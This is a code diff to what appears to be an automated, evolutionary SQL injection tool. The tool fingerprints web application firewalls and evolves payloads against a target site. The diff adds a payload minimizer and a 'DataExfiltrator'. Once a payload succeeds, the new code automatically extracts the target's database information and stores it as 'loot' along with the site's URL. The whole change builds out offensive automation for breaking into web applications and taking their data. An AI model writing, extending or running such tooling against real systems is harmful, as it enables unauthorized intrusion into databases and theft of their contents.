@@ -7,6 +7,8 @@ from core.predictive_blocker import PredictiveBlocker
 from core.waf_fingerprinter import WAFFingerprinter
 from core.error_refiner import SQLErrorRefiner
 from core.differential_analyzer import DifferentialAnalyzer
+from core.payload_minimizer import PayloadMinimizer
+from core.data_exfiltrator import DataExfiltrator
 from utils.success_validator import SuccessValidator
 
 class IslandManager:
@@ -26,6 +28,8 @@ class IslandManager:
         self.fingerprinter = WAFFingerprinter()
         self.error_refiner = SQLErrorRefiner()
         self.diff_analyzer = DifferentialAnalyzer(client)
+        self.minimizer = PayloadMinimizer(client, self.validator)
+        self.exfiltrator = DataExfiltrator(client, self.validator)
         self.session_tested = set() # Avoid repeating in same session
         self.current_gen = 0
         self.waf_info = {"name": "GENERIC / UNKNOWN", "probed": False, "blocked_chars": []}
@@ -319,11 +323,26 @@ class IslandManager:
             
             # Multi-Success Awareness
             if score >= 0.9 and payload not in self.hall_of_fame:
+                # 4. Payload Minimization (Idea #1)
+                minimized_payload = self.minimizer.minimize(payload, score)
+                if minimized_payload != payload:
+                    print(f"  [Minimizer] Payload reduced from {len(payload)} to {len(minimized_payload)} chars.", flush=True)
+                    payload = minimized_payload
+
                 if status not in self.discovered_niches:
                     print(f"[!!!] NEW EXPLOIT TYPE (Island {island['id']}): {status} | {payload}", flush=True)
                     self.discovered_niches.add(status)
                     self.hall_of_fame.append(payload)
                     self.exp_manager.save_exploit(payload, status)
+                    
+                    # 5. Automated Loot Exfiltration (Idea #2)
+                    loot = self.exfiltrator.exfiltrate(payload)
+                    if loot["database"]:
+                        print(f"  [Loot] Automated extraction successful. Database: {loot['database']}", flush=True)
+                        # Save loot to DB via exp_manager (if method exists)
+                        if hasattr(self.exp_manager, 'save_loot'):
+                            self.exp_manager.save_loot(self.client.base_url, loot)
+
                 elif score >= 1.0:
                     self.hall_of_fame.append(payload)
                     self.exp_manager.save_exploit(payload, "PERFECT_MATCH")
